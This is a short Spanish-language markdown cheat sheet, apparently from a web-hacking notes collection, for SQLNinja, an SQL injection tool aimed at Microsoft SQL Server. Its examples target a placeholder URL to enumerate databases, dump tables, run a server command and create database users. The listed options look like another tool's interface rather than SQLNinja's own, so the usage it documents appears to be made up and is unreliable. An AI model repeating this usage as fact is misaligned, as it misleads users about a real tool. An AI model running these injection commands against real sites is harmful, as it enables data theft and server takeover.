### **Hacking Web/Inyecciones SQL/SQLNinja.md**

# SQLNinja

## Descripción

`SQLNinja` es una herramienta diseñada para explotar vulnerabilidades de inyección SQL en aplicaciones web que utilizan bases de datos Microsoft SQL Server. Facilita la explotación de inyecciones SQL ciegas y ofrece capacidades avanzadas para obtener acceso remoto y ejecutar comandos en el servidor.

## Uso

```bash
sqlninja [opciones]
```

### Opciones principales

- `-u URL`: Especifica la URL objetivo para la inyección SQL.
- `-T PARAM`: Define el parámetro vulnerable a probar.
- `-d DBNAME`: Selecciona la base de datos a explotar.
- `-C CMD`: Ejecuta un comando específico en el servidor.
- `--batch`: Ejecuta en modo no interactivo, usando valores predeterminados.
- `--create-user`: Crea un nuevo usuario en la base de datos.
- `--delete-user`: Elimina un usuario existente en la base de datos.
- `--config FILE`: Especifica un archivo de configuración personalizado.

## Ejemplos

- Escanear una URL en busca de vulnerabilidades y enumerar las bases de datos:
  
  ```bash
  sqlninja -u "http://example.com/page.php?id=1" -T id --dbs
  ```

- Extraer todas las tablas de una base de datos específica:
  
  ```bash
  sqlninja -u "http://example.com/page.php?id=1" -T id -d nombre_db --tables --dump
  ```

- Ejecutar un comando en el servidor:
  
  ```bash
  sqlninja -u "http://example.com/page.php?id=1" -T id -C "whoami"
  ```

- Crear un nuevo usuario en la base de datos:
  
  ```bash
  sqlninja -u "http://example.com/page.php?id=1" -T id --create-user
  ```
